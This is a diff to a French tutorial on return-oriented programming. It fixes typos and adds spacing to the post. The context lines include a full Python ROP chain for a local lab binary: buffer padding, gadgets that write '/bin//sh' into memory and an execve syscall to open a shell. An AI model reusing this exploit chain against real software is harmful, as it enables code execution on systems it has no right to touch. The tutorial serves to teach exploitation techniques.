@@ -139,7 +139,7 @@ Vous voyez que nous avons les adresses de ces 4 gadgets (suites d'instructions) 
 
 Pour que l'exemple reste simple, nous allons effectuer un appel système `sys_exit` avec comme argument la valeur `3` (Pour tous les appels systèmes vous pouvez jeter un oeil à mon github pour les architectures [32 bits](https://github.com/Hackndo/misc/blob/master/syscalls32.md) et les [64 bits](https://github.com/Hackndo/misc/blob/master/syscalls64.md)).
 
-D'après le tableau 32 bits, pour faire un appel système à `sys_exit`, `EAX` doit prendre la valeur **1** et `EBX` la valeur du code de retout, ici **3** comme nous l'avons décidé.
+D'après le tableau 32 bits, pour faire un appel système à `sys_exit`, `EAX` doit prendre la valeur **1** et `EBX` la valeur du code de retour, ici **3** comme nous l'avons décidé.
 
 Afin d'obtenir ces valeurs, en ayant les 4 différentes suites d'instructions précédentes, nous pouvons faire ceci :
 
@@ -166,7 +166,7 @@ XOR    EAX, EAX
 RET
 ```
 
-Une fois le `XOR` effectué, c'es l'instruction `RET` qui va être exécutée. Pour rappel, un `RET` n'est rien d'autre qu'un `POP EIP`. L'adresse sur le dessus de la pile va donc être mis dans le registre `EIP`. Comme l'adresse sur le dessus de la pile est juste après le sEIP que nous avons écrasé (et qui a déjà été `POP` par le `RET` de la fonction), il suffit de mettre l'adresse du deuxième gadget sur le sommet de la pile, comme suit :
+Une fois le `XOR` effectué, c'est l'instruction `RET` qui va être exécutée. Pour rappel, un `RET` n'est rien d'autre qu'un `POP EIP`. L'adresse sur le dessus de la pile va donc être mis dans le registre `EIP`. Comme l'adresse sur le dessus de la pile est juste après le sEIP que nous avons écrasé (et qui a déjà été `POP` par le `RET` de la fonction), il suffit de mettre l'adresse du deuxième gadget sur le sommet de la pile, comme suit :
 
 [![second_gadget]({{ site.baseurl }}assets/uploads/2016/10/second_gadget.png)]({{ site.baseurl }}assets/uploads/2016/10/second_gadget.png)
 
@@ -259,12 +259,12 @@ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 
 Vous pourrez toujours revenir à votre configuration d'origine en remettant le numéro que vous aviez initialement.
 
-Nous allons essayer de lancer un shell avec ce programme, malgré les protections mises en place. Pour cela, nous allons avoir besoin de gadgets. Un outil extrêmement connu pour cette recherche s'appelle [ROPGadget](http://shell-storm.org/project/ROPgadget/), je vous laisse l'installer. Il est très puissant et possède tout un tas d'options.
+Nous allons essayer de lancer un shell avec ce programme, malgré les protections mises en place. Pour cela, nous allons avoir besoin de gadgets. Un outil extrêmement connu pour cette recherche s'appelle [ROPgadget](http://shell-storm.org/project/ROPgadget/), je vous laisse l'installer. Il est très puissant et possède tout un tas d'options.
 
 Une commande de base est 
 
 ```sh
-$ ROPGadget --binary rop
+$ ROPgadget --binary rop
 
 ```
 
@@ -358,27 +358,41 @@ Voici un code python qui prépare le débordement en chainant les gadgets.
 ```python
 p =  pack('<I', 0x0806ed1a) 		# pop edx ; ret
 p += pack('<I', 0x080ea000) 		# Dans edx, nous mettons l'adresse du début de .data
+
 p += pack('<I', 0x080b8056) 		# pop eax ; ret
 p += '/bin'				# Dans eax, nous mettons la chaine de caractères "/bin"
+
 p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | Ce qui permet d'écrire "/bin" dans .data
+
 p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
 p += pack('<I', 0x080ea004) 		# Dans edx, nous mettons l'adresse de .data + 4 pour prévoir "//sh"
+
 p += pack('<I', 0x080b8056) 		# pop eax ; ret
 p += '//sh'				# Nous mettons "//sh" dans eax
+
 p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | Et nous écrivons "//sh" juste après "/bin"
+
 p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
 p += pack('<I', 0x080ea008) 		# Dans edx, nous mettons l'adresse de .data + 8, donc après la chaine de caractères "/bin//sh"
+
 p += pack('<I', 0x08049323) 		# xor eax, eax ; ret
+
 p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | Et on s'assure que cet emplacement contient des 0x00 pour terminer la chaine de caractères
+
 p += pack('<I', 0x080481c9) 		# pop ebx ; ret
 p += pack('<I', 0x080ea000) 		# Dans ebx, nous mettons l'adresse du début de .data, qui contient "/bin//sh" suivi de null bytes
+
 p += pack('<I', 0x080de7ad) 		# pop ecx ; ret
 p += pack('<I', 0x00000000) 		# On met ecx à 0
+
 p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
 p += pack('<I', 0x00000000) 		# On met edx à 0
+
 p += pack('<I', 0x08049323) 		# xor eax, eax ; ret
+
 for i in range(11):			# Afin d'avoir eax = 11, on boucle 11 fois
 	p += pack('<I', 0x0804812c)	# inc eax ; ret
+
 p += pack('<I', 0x0806c985) 		# int 0x80
 ```
 
@@ -398,27 +412,41 @@ p = "A"*148
 
 p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
 p += pack('<I', 0x080ea000) 	# Dans edx, nous mettons l'adresse du début de .data
+
 p += pack('<I', 0x080b8056) 	# pop eax ; ret
 p += '/bin'						# Dans eax, nous mettons la chaine de caractères "/bin"
+
 p += pack('<I', 0x080546db) 	# mov dword ptr [edx], eax ; ret | Ce qui permet d'écrire "/bin" dans .data
+
 p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
 p += pack('<I', 0x080ea004) 	# Dans edx, nous mettons l'adresse de .data + 4 pour prévoir "//sh"
+
 p += pack('<I', 0x080b8056) 	# pop eax ; ret
 p += '//sh'						# Nous mettons "//sh" dans eax
+
 p += pack('<I', 0x080546db) 	# mov dword ptr [edx], eax ; ret | Et nous écrivons "//sh" juste après "/bin"
+
 p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
 p += pack('<I', 0x080ea008) 	# Dans edx, nous mettons l'adresse de .data + 8, donc après la chaine de caractères "/bin//sh"
+
 p += pack('<I', 0x08049323) 	# xor eax, eax ; ret
+
 p += pack('<I', 0x080546db) 	# mov dword ptr [edx], eax ; ret | Et on s'assure que cet emplacement contient des 0x00 pour terminer la chaine de caractères
+
 p += pack('<I', 0x080481c9) 	# pop ebx ; ret
 p += pack('<I', 0x080ea000) 	# Dans ebx, nous mettons l'adresse du début de .data, qui contient "/bin//sh" suivi de null bytes
+
 p += pack('<I', 0x080de7ad) 	# pop ecx ; ret
 p += pack('<I', 0x00000000) 	# On met ecx à 0
+
 p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
 p += pack('<I', 0x00000000) 	# On met edx à 0
+
 p += pack('<I', 0x08049323) 	# xor eax, eax ; ret
+
 for i in range(11):				# Afin d'avoir eax = 11, on boucle 11 fois
 	p += pack('<I', 0x0804812c) # inc eax ; ret
+
 p += pack('<I', 0x0806c985) 	# int 0x80
 
 r.sendline(p)
